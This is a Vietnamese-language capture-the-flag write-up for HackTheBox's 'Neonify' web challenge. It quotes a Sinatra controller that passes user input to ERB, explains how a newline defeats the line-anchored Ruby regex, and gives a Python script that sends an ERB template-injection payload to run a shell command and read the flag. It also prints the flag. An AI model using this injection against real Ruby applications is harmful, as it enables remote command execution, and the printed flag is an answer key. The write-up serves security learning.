# HACKTHEBOX - Web: Neonify

**CHALLENGE DESCRIPTION**

It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!

# Quick Review

ảnh

1. Web app có chức năng nhận user input rồi in trả về glowing string ánh neon
2. Challenge cho source-code


file `/app/controllers/neon.rb`:
```ruby
class NeonControllers < Sinatra::Base

  configure do
    set :views, "app/views"
    set :public_dir, "public"
  end

  get '/' do
    @neon = "Glow With The Flow"
    erb :'index'
  end

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end
```

Nghe miêu rả thì nó rất là mùi `SSTI` rồi. First thing first bypass cái regex

**Tham khảo**: https://ruby-doc.org/core-2.7.5/doc/security_rdoc.html

Thì `=~` là `match regex operator` trong ruby. Hơn cả, trong ruby `^` và `$` không phải là kí tự biểu diễn *bắt đầu hay kết thúc chuỗi* mà là *bắt đầu hay ết thúc dòng(line)*. Vậy với regex trên để bypass ta chỉ cần `ahihi\n,/.?><';[][thoaimoai`

Tiếp, `ERB` là  `template language` trong ruby: https://puppet.com/docs/puppet/5.5/lang_template_erb.html

`ERB.new()` ta đang tạo render 1 template string, SSTI trong ERB template: https://twitter.com/harshbothra_/status/1498324305872318464

Ta tạo script python gửi payload bởi từ browser interface khó gửi kí tự `newline`(thử \n vs %0a \*ó đc)

```python
import requests

url = 'http://159.65.92.13:30620/'

r = requests.post(url, data={
    'neon': "hihi\n<%= `cat /app/flag.txt` %>"
    })

print(r.text)
```

**flag**: `HTB{r3pl4c3m3n7_s3cur1ty}`
